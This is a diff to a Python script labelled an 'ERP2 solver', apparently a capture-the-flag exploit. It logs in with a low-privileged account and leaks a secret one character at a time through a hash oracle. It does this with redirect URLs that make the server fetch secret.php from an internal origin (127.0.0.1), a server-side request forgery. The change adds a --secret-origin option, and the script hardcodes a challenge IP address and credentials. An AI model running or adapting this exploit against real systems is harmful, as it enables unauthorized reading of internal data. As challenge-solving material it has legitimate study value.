@@ -455,10 +455,10 @@ class ERP2Oracle(Bruteforcer):
         raise last_error
 
 
-def build_redirect_resource(base_url: str, index: int, inner_filter: str, redirector: str) -> str:
+def build_redirect_resource(secret_origin: str, index: int, inner_filter: str, redirector: str) -> str:
     from urllib.parse import quote
 
-    inner = f"{base_url}/secret.php?index={index}&filter={inner_filter}"
+    inner = f"{secret_origin.rstrip('/')}/secret.php?index={index}&filter={inner_filter}"
     return redirector.format(url=quote(inner, safe=':/?='))
 
 
@@ -491,6 +491,11 @@ def login(session: requests.Session, login_url: str, username: str, password: st
 def main() -> int:
     parser = argparse.ArgumentParser(description="ERP2 solver")
     parser.add_argument("--base-url", default="http://16.184.35.242", help="Challenge base URL")
+    parser.add_argument(
+        "--secret-origin",
+        default="http://127.0.0.1",
+        help="Internal origin that secret.php must be fetched from",
+    )
     parser.add_argument("--username", default="mkim", help="Low-privileged account username")
     parser.add_argument("--password", default="erp123", help="Low-privileged account password")
     parser.add_argument(
@@ -505,6 +510,7 @@ def main() -> int:
     args = parser.parse_args()
 
     base_url = args.base_url.rstrip("/")
+    secret_origin = args.secret_origin.rstrip("/")
     login_url = f"{base_url}/login.php"
     hash_url = f"{base_url}/hash.php"
 
@@ -513,7 +519,7 @@ def main() -> int:
 
     recovered = []
     for index in range(args.max_index):
-        resource = build_redirect_resource(base_url, index, args.inner_filter, args.redirector)
+        resource = build_redirect_resource(secret_origin, index, args.inner_filter, args.redirector)
         ch = leak_char(session, hash_url, resource, args.retries, args.timeout)
         print(f"[{index:02d}] {ch}", flush=True)
         if ch == "/":
